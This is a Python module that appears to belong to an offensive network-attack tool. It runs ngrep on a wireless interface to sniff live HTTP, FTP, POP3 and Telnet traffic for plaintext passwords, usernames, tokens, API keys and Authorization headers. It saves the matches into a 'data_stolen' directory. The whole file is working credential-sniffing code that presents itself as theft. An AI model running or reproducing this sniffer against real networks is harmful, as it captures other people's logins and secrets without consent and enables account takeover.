import os
import subprocess
import logging
from datetime import datetime

logger = logging.getLogger(__name__)

# Patterns to search for in plaintext traffic
PATTERNS = [
    'pass', 'password', 'passwd', 'pwd',
    'user', 'username', 'login', 'auth',
    'token', 'api_key', 'secret', 'Authorization',
    'PASS ', 'USER ',  # FTP/POP3
]

def run(shared_data):
    """Use ngrep to search live traffic for plaintext credentials/tokens."""
    if not getattr(shared_data, 'ngrep_enabled', False):
        return

    if subprocess.call(['which', 'ngrep'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) != 0:
        logger.warning("ngrep not found — skipping")
        return

    iface = getattr(shared_data, 'wlan_interface', 'wlan0')
    network_name = getattr(shared_data, 'connected_network', 'unknown')
    safe_name = "".join(c if c.isalnum() or c in ('-', '_') else '_' for c in network_name)
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')

    output_dir = os.path.join(getattr(shared_data, 'data_stolen_dir', 'data_stolen'), 'ngrep')
    os.makedirs(output_dir, exist_ok=True)
    out_path = os.path.join(output_dir, f"{safe_name}_{timestamp}.txt")

    # Build combined regex pattern
    pattern = '|'.join(PATTERNS)

    try:
        shared_data.ragnarstatustext = "ngrep scan"
        shared_data.ragnarstatustext2 = network_name[:16]
        logger.info(f"Starting 30s ngrep on {iface}")
        result = subprocess.run(
            ['ngrep', '-d', iface, '-W', 'byline', '-q', pattern, 'port 80 or port 21 or port 110 or port 23'],
            timeout=35,
            capture_output=True,
            text=True,
            errors='replace'
        )
        output = result.stdout.strip()
        if output:
            with open(out_path, 'w') as f:
                f.write(f"# ngrep capture: {network_name} @ {timestamp}\n")
                f.write(f"# Interface: {iface}\n\n")
                f.write(output)
            logger.info(f"ngrep results saved: {out_path}")
        else:
            logger.info("ngrep: no matching traffic found")
    except subprocess.TimeoutExpired:
        logger.info("ngrep scan completed (timeout)")
    except Exception as e:
        logger.error(f"ngrep error: {e}")
